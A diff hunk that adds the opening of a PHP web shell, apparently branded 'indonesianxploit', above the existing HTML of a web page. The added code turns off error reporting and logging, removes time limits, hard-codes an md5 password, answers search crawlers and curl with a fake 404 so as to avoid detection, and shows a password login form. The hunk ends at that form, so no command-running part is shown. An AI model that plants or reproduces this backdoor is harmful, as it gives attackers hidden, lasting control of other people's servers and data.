@@ -1,3 +1,56 @@
+<?php
+session_start();
+@error_reporting(0);
+@set_time_limit(0);
+
+if(version_compare(PHP_VERSION, '5.3.0', '<')) {
+	@set_magic_quotes_runtime(0);
+}
+
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+
+$password = "9e2aa4ba13c56ed1e00fd6c0a870a3c4"; # md5: admin
+
+$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
+$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+function login_shell() {
+?>
+</style>
+</head>
+<center>
+<header>
+	<pre>
+ ___________________________
+< root@indonesianxploit:~# w00t??? > █████ █████  ███               █████████  █████                            ██████████                      █████ █████                  ███
+░░███ ░░███  ░░░               ███░░░░░███░░███                            ░░███░░░░███                    ░░███ ░░███                  ░███
+ ░░███ ███   ████  ████████   ███     ░░░  ░███████    ██████    ██████     ░███   ░░███ ████████   ██████  ░███  ░███ █ █████████████  ░███
+  ░░█████   ░░███ ░░███░░███ ░███          ░███░░███  ░░░░░███  ███░░███    ░███    ░███░░███░░███ ███░░███ ░███████████░░███░░███░░███ ░███
+   ███░███   ░███  ░███ ░███ ░███          ░███ ░███   ███████ ░███ ░███    ░███    ░███ ░███ ░░░ ░███████  ░░░░░░░███░█ ░███ ░███ ░███ ░███
+  ███ ░░███  ░███  ░███ ░███ ░░███     ███ ░███ ░███  ███░░███ ░███ ░███    ░███    ███  ░███     ░███░░░         ░███░  ░███ ░███ ░███ ░░░ 
+ █████ █████ █████ ████ █████ ░░█████████  ████ █████░░████████░░██████     ██████████   █████    ░░██████        █████  █████░███ █████ ███
+░░░░░ ░░░░░ ░░░░░ ░░░░ ░░░░░   ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░     ░░░░░░░░░░   ░░░░░      ░░░░░░        ░░░░░  ░░░░░ ░░░ ░░░░░ ░░░ 
+                                                                                                                                            
+                                                                                                                                            
+                                                                                                                                            
+	</pre>
+</header>
+<form method="post">
+<input type="password" name="password">
+</form>
 <!DOCTYPE html>
 <html>
 <head>
